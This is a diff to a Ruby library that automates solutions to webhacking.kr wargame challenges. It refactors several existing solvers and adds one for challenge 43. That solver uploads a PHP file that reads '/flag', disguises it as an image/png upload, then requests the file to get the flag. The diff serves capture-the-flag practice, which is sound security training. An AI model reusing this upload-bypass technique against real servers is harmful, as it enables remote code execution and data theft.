@@ -131,11 +131,7 @@ module WebhackingKR
     ##
     # Authenticates the flag
     def auth(flag)
-      response = post(
-        Wargame::QUERY_AUTH,
-        { 'flag' => flag }
-      )
-      response.body
+      @wargame.auth(flag)
     end
 
     private
@@ -756,7 +752,7 @@ module WebhackingKR
         LEVEL2_PATH,
         {
           'post' => 'hehe',
-          'post2' => 'hehe2',
+          'post2' => 'hehe2'
         }
       )
       unless response.body =~ /Next/
@@ -783,7 +779,7 @@ module WebhackingKR
         failed
         return
       end
-      log("Server timestamp: #{$1}")
+      log("Server timestamp: #{Regexp.last_match[1]}")
       time = Time.now.to_i + 1
       log("Timestamp: #{time}")
       query = URI.encode_www_form(
@@ -1056,17 +1052,17 @@ module WebhackingKR
         PATH,
         [[PARAM_UP, '', { filename: file_name }]]
       )
-      unless response.body =~ %r(copy\(\./(.*)/#{file_name}\))
+      unless response.body =~ %r{copy\(\./(.*)/#{file_name}\)}
         failed
         return
       end
 
-      upload_dir = $1
+      upload_dir = Regexp.last_match(1)
       file_name = 'flag'
       path = "#{upload_dir}/#{file_name}"
       log("Directory: #{upload_dir}")
       log('Uploading file')
-      response = upload(
+      upload(
         PATH,
         [[PARAM_UP, '', { filename: file_name }]]
       )
@@ -1078,8 +1074,8 @@ module WebhackingKR
         return
       end
 
-      log($1)
-      check(auth($1))
+      log(Regexp.last_match[1])
+      check(auth(Regexp.last_match[1]))
     end
   end
 
@@ -1106,6 +1102,47 @@ module WebhackingKR
 
       log(match[1])
       check(auth(match[1]))
+    end
+  end
+
+  ##
+  # Challenge 43
+  class Challenge43 < ChallengeBase
+    CHALLENGE = 43
+
+    PORT = 10_004
+    PATH = '/'
+    PARAM_FILE = 'file'
+    UPLOAD_DIR = 'upload'
+    PAYLOAD = "<?php echo file_get_contents('/flag'); ?>"
+
+    def initialize(*)
+      super
+      uri = URI.parse(Wargame::BASE_URI)
+      @client = Net::HTTP.new(uri.host, PORT)
+    end
+
+    def exec
+      file_name = "#{SecureRandom.alphanumeric(10)}.php"
+      log("Uploading file #{file_name}")
+      response = upload(
+        PATH,
+        [[PARAM_FILE, PAYLOAD, { filename: file_name, content_type: 'image/png' }]]
+      )
+      unless response.body =~ /Done!/
+        failed
+        return
+      end
+
+      log('Getting file')
+      response = get("#{PATH}#{UPLOAD_DIR}/#{file_name}")
+      unless response.body =~ /(FLAG\{.*\})/
+        failed
+        return
+      end
+      flag = Regexp.last_match(1)
+      log(flag)
+      check(auth(flag))
     end
   end
 
